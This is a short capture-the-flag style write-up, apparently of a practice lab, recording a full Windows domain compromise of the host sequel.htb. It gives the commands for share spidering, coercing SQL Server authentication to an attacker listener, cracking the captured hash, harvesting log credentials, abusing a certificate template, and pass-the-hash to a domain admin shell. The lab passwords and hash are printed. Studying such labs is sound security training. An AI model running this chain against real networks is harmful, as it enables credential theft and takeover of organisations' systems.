# Take Away
- Logs are important and can sometimes contains sensitive information like passwords.
- One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is using `netexec`
	- ``
# Metadata
- Enumerating and downloading the file within publicly-accessible share `Public` using `netexec smb 10.10.11.202 -u guest -p "" -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/home/saxon/Desktop/smb` will reveal a `.pdf` file containing a pair of `mssql` credential `PublicUser:GuestUserCantWrite1`.![[Pasted image 20240302142447.png]]
- After logging in with `impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202`, one does not have the privilege to enable `xp_cmdshell` but can call `xp_dirtree \\10.10.14.6\test,1,1` to force authentication.
	- Run `sudo responder -i tun0 -A` to capture the authentication request and extract `NET-NTLMv2` hash.![[Pasted image 20240302145354.png]]
- Use `hashcat -m 5600 sql_svs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` to crack the hash to obtain a pair of valid domain credential `sql_svc:REGGIE1234ronnie`.![[Pasted image 20240302152340.png]]
- Spraying the credential, one can identify that `sql_svc` can access the host using `winrm`.![[Pasted image 20240302152935.png]]
- One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is using `netexec`
	- Add the `10.10.11.202 dc.sequel.htb` to `/etc/host`.
	- Run `netexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs` to confirm the existence of PKI from ADCS.![[Pasted image 20240302172918.png]]
- Running `certipy-ad find -dc-ip 10.10.11.202 -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -stdout -vulnerable` will identify a vulnerable certificate template.![[Pasted image 20240302170418.png]]
# Exploitation
- Obtain a session with `evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie` as user `sql_svc`.
	- Navigate to `C:\SQLServer\Logs` and go through `ERRORLOG.BAK` to identify a another pair of potential credential `sequel.htb\Ryan.Cooper:NuclearMosquito3`.![[Pasted image 20240302155036.png]]
	- Spraying the credential again can find that it can be used to access the host using `winrm`.![[Pasted image 20240302155207.png]]
-  Obtain a session with `evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3` as user `Ryan.Cooper`.
# PrivEsc
- Run `certipy-ad req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202 -target 10.10.11.202 -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication` to get a `.pfx` file as `sequel\administrator`.
- Upload `Rubeus.exe` and `administrator.pfx` to the target host. Run `.\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials` to obtain the `NTLM` hash `A52F78E4C751E5F5E17E1E9F3E58F4EE` of the domain administrator account.![[Pasted image 20240302193035.png]]
- Run `impacket-psexec -hashes :A52F78E4C751E5F5E17E1E9F3E58F4EE sequel/administrator@10.10.11.202 powershell.exe` to obtain a shell session as domain administrator.